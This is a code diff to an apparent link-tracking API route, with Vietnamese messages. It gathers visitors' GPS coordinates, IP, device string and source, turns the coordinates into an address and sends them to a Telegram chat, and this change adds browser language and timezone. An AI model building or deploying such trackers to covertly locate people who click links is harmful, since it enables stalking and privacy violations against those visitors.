@@ -55,7 +55,7 @@ async function sendTelegramNotification(message: string) {
 export async function POST(request: Request) {
   try {
     const body = await request.json();
-    const { lat, lon, acc, ip, from } = body;
+    const { lat, lon, acc, ip, from, language, timezone } = body;
 
     const headersList = headers();
     const ua = headersList.get('user-agent') ?? 'unknown';
@@ -71,11 +71,15 @@ export async function POST(request: Request) {
     logData += `Nguồn: ${from || 'link'}\n`;
     logData += `Thiết bị: ${ua}\n`;
     logData += `Địa chỉ IP: ${finalIp}\n`;
+    logData += `Ngôn ngữ: ${language || 'N/A'}\n`;
+    logData += `Múi giờ: ${timezone || 'N/A'}\n`;
 
     let telegramMessage = `*🔔 Truy cập mới (${sourceText})!*\n\n`;
     telegramMessage += `*Thời gian:* \`${new Date(timestamp).toLocaleString('vi-VN')}\`\n`;
     telegramMessage += `*Thiết bị:* \`${ua}\`\n`;
     telegramMessage += `*Địa chỉ IP:* \`${finalIp}\`\n`;
+    telegramMessage += `*Ngôn ngữ:* \`${language || 'N/A'}\`\n`;
+    telegramMessage += `*Múi giờ:* \`${timezone || 'N/A'}\`\n`;
 
     if (lat !== undefined && lon !== undefined) {
       const address = await getAddress(lat, lon);
